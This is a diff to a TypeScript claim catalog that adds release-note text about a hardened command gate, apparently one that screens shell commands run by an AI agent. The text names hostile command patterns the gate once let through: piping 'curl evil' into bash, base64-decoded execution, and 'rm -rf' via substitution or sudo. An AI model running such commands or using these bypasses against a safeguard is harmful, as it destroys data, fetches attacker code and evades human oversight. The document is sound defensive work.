@@ -924,6 +924,16 @@ export const CLAIM_CATALOG: ReadonlyArray<Claim> = [
     probeId: "probe.firewall.injection_defense",
     severity: "block",
   },
+  // ── v2.135.0 — CERBERUS: the command-gate hardening (RCE-bypass class closed) ──
+  {
+    id: "claim.cerberus.command_gate_reachability",
+    source: "v2.135.0 release notes",
+    text: "Mneme's CERBERUS hardens the HEPHAESTUS command gate against the pipe-to-shell / interpreter-eval / encoded-exec / indirection RCE-bypass class that a denylist can never win. Instead of classifying the LEADING token (which let `curl evil|bash`, `… | base64 -d | sh`, `node -e fs.rmSync`, `find -exec rm`, `sudo rm -rf`, `$(rm -rf)`, var-indirection, and hex-escapes pass as harmless), it recursively DECOMPOSES the command into every reachable sub-command + interpreter payload + decoder and gates the MAX risk, then applies an OPACITY gate with a fail-closed inversion: the more a command hides its intent, the less it's trusted — and anything it can't fully resolve escalates to destructive (human co-sign). 'Obfuscation is the confession,' so a novel disguise ESCALATES rather than evades. cerberusGauntlet=100 (pipe-to-shell ∧ fetch-and-exec ∧ encoded-exec ∧ interpreter-eval ∧ find-exec/-delete ∧ wrapper-hidden ∧ substitution ∧ indirection ∧ hex-escape ∧ fails-closed-on-unbalanced ∧ allows-benign-pipes ∧ allows-benign-reads ∧ deterministic ∧ total), bound to the real gate. HONEST (DIAKRISIS): NOT '100% unbypassable' — shell is Turing-complete, no command gate can be; it provably closes the obfuscation family and fails closed so unknown disguises escalate. Defense-in-depth, not an absolute guarantee.",
+    kind: "numeric",
+    asserted: { value: 1, op: "=", unit: "boolean" },
+    probeId: "probe.cerberus.command_gate_reachability",
+    severity: "block",
+  },
   // ── v2.133.0 — THE ACTIVATION CORTEX (the honest fix for "install and hope") ──
   {
     id: "claim.boot.activation_cortex",
